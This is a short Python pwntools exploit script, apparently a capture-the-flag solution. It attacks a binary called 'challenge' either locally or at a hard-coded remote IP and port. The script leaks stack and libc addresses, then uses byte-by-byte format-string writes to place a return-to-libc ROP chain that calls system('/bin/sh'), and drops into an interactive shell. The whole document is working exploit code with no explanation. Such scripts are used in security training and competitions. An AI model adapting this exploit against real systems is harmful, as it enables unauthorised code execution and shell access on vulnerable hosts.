from pwn import *

if args.LOCAL:
    io=process('./challenge')
    if args.GDB:
        cmd="""
        init-pwndbg
        b* vuln+132
        """
        gdb.attach(io, cmd)
    libc=ELF('/home/w1n_gl0ry/Tools/glibc_debug/2.35/amd64/libc-2.35.so')
else:
    io=remote('34.70.212.151', 8003)
    libc=ELF('./libc6_2.35-0ubuntu3.5_amd64.so')

io.sendline(b'1')    


def write(byte, add):
    io.sendline(b'2')
    pl = '%{}c%8$hhn'.format(byte).ljust(16,'\0').encode()
    pl+=add
    io.sendline(pl)

io.recvuntil(b'>> ')

stack=int(io.recv(14), 16)
print(hex(stack))
io.recv(1)
libc.address=int(io.recv(14), 16) - libc.sym.fgets
print(hex(libc.address))
ret=0x38+stack
print(hex(ret))

pop_rdi=libc.address+0x000000000002a3e5
pl=p64(pop_rdi+1)
pl+=p64(pop_rdi)
pl+=p64(next(libc.search(b'/bin/sh')))
pl+=p64(libc.sym.system)
print(pl)
pause()

for i in range(0, len(pl)//8, 1):
    for j in range(0, 6, 1):
        write(u8(pl[8*i+j:8*i+j+1]), p64(ret+i*8+j))

 
io.interactive()